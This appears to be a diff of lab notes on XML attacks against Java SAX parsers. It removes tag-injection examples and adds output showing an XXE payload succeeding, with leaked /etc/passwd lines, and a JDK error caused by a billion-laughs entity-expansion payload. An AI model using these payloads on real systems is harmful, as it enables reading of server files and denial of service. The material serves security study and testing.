@@ -1,38 +1,6 @@
 XML Attacks for SAX Parsers
 -------------------------------------------------------------------------------
 
-Tag Injection
--------------------------------------------------------------------------------
-
-Example: Injecting new attributes and elements
-
-	<SessionRoot>
-	    <Sessions>
-	        <Session id="one" valid="true" hack="true"/>
-	        <Session id="two" valid="false" />
-	    </Sessions>    
-	    <Hack>
-	    	<blackhack id="666" />
-	    </Hack>
-	</SessionRoot>
-
-
-Example: Overriding existing elements
-
-	<Item>
-		<description>Widget</description>
-		<price>500.0</price>
-		<quantity>1</quantity>
-		
-		<!-- Additional Rows below for price and quantity -->
-		<price>1.0</price>
-		<quantity>1000</quantity>
-	</Item>
-
-=> Works without XML Schema validation!!
-   (See ItemTest)
-   
-
 XXL EXternal Entity Attack (XXE)
 -------------------------------------------------------------------------------
 
@@ -45,6 +13,28 @@ Example:
         <Session id="two" valid="false" />
     </Sessions>    
     <Hack>&xxe;</Hack>
+</SessionRoot>
+
+=> Is working!!
+
+<SessionRoot>
+    <Sessions>
+        <Sessionid=one valid=true ></Session>
+
+        <Sessionid=two valid=false ></Session>
+
+    </Sessions>
+
+    <Hack>root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+...
+student:x:1000:1000:student:/home/student:/bin/bash
+vboxadd:x:986:1::/var/run/vboxadd:/bin/false
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+sphinx:x:985:977:Sphinx Search:/usr/lib/tmpfiles.d/lib/sphinx:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+</Hack>
+
 </SessionRoot>
 
 
@@ -63,12 +53,14 @@ Example:
 	  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 	  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
 	]>
-	<lolz>&lol9;</lolz>	   	
-	
+	<lolz>&lol9;</lolz>
+
 => Doesn't work in a JDK > 1.4
 	"The parser has encountered more than "64,000" entity expansions in this document..."
 
-
+org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 1;
+JAXP00010001: The parser has encountered more than "64000" entity expansions
+in this document; this is the limit imposed by the JDK.
 
 
 Resources:
